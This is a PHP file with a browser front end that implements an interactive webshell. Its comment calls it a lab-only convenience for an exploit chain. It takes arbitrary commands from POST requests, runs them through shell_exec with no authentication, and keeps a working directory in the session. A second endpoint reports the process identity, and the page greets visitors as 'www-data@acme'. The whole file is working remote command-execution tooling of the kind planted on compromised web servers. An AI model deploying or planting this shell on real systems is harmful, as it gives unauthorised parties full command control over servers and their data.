<?php
/**
 * Lab-only interactive shell endpoint.
 *
 * Why this exists: the classic one-request webshell cannot do `cd && ls`,
 * because each HTTP request is a fresh process with a fresh working
 * directory. This endpoint keeps a working directory in the session so
 * ordinary shell behaviour works (`cd /etc`, `ls`, `cat ...`).
 *
 * This is a *lab convenience*, not part of the exploit chain. The exploit
 * itself only needs to land ~14 bytes of command.
 */
session_start();

$cwd = $_SESSION['cwd'] ?? '/var/www/html';

if (isset($_POST['cmd'])) {
    $cmd = (string)$_POST['cmd'];

    // Handle `cd` in PHP so the directory survives to the next request.
    if (preg_match('/^\s*cd\s+(.+?)\s*$/', $cmd, $m)) {
        $target = $m[1];
        if ($target === '~' || $target === '') { $target = '/root'; }
        $guess = $target[0] === '/' ? $target : $cwd . '/' . $target;
        $real = realpath($guess);
        if ($real && is_dir($real)) {
            $_SESSION['cwd'] = $real;
            $cwd = $real;
            echo "cd: now in " . $real . "\n";
        } else {
            echo "cd: no such directory: " . $target . "\n";
        }
        exit;
    }

    $out = shell_exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
    echo $out === null ? '' : $out;
    exit;
}

if (isset($_GET['whoami'])) {
    header('Content-Type: text/plain');
    echo trim(shell_exec('id')) . "\n";
    echo "cwd=" . $cwd . "\n";
    exit;
}
?>
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>shell</title>
<style>
 body{background:#0f1419;color:#d6e2ee;font:13px/1.5 Menlo,Consolas,monospace;margin:0;padding:18px}
 #out{white-space:pre-wrap;margin-bottom:10px;min-height:120px}
 .p{color:#5fb37a}
 form{display:flex;gap:8px}
 input{flex:1;background:#1a222c;border:1px solid #2b3644;color:#d6e2ee;
       padding:8px 10px;border-radius:4px;font:inherit}
 button{background:#2e75b6;color:#fff;border:0;padding:8px 14px;border-radius:4px;cursor:pointer}
</style></head><body>
<div id="out"></div>
<form id="f"><span class="p" id="ps"></span>
  <input id="c" autocomplete="off" autofocus placeholder="ls -la">
  <button>Run</button></form>
<script>
const outEl=document.getElementById('out'), cEl=document.getElementById('c'),
      fEl=document.getElementById('f'), psEl=document.getElementById('ps');
async function run(cmd){
  const cur=outEl.textContent;
  outEl.textContent=cur+(cur?'\n':'')+psEl.textContent+' '+cmd+'\n';
  const r=await fetch(location.pathname,{method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'cmd='+encodeURIComponent(cmd)});
  outEl.textContent+=await r.text();
  await refresh();
  outEl.scrollIntoView(false);
}
async function refresh(){
  const r=await fetch(location.pathname+'?whoami=1');
  const t=await r.text();
  const m=t.match(/cwd=(.*)/); if(m) psEl.textContent='www-data@acme:'+m[1]+'$';
}
fEl.addEventListener('submit',e=>{e.preventDefault();
  const c=cEl.value.trim(); if(c){cEl.value='';run(c);} });
refresh(); run('id; pwd; ls -la');
</script>
</body></html>
